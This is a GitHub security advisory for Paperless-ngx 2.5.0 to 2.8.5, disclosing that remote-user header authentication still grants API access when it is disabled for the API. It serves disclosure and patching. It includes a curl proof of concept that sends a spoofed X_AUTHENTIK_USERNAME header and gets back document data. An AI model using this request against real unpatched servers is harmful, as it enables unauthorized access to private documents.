# Remote user auth via header works even when disabling it for API

Low

[shamoon](/shamoon)
published
GHSA-72w4-hxqq-c256
May 15, 2024

## Package

Paperless-ngx

## Affected versions

2.5.0 - 2.8.5

## Patched versions

2.8.6

## Description

### Summary

Remote User auth allows API access even if it is explicitly disabled (see below)

### Details

If I call:

```
curl -vvv -H "X_AUTHENTIK_USERNAME: franz" https://paperless.myserver.com/api/documents/590/

```

I get this repsonse:

```

  "owner": 2,
  "user_can_change": true,
  "is_shared_by_requester": false,
  "notes": [],
  "custom_fields": []
}

```

insted of:

```
{
  "detail": "Authentication credentials were not provided."
}

```

or 403 forbidden.

If I call:

```
curl -vvv https://paperless.myserver.com/api/documents/590/

```

I get

```
{
  "detail": "Authentication credentials were not provided."
}

```

So it seems that `PAPERLESS_ENABLE_HTTP_REMOTE_USER_API` is ignored or works differently than I would expect.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:N
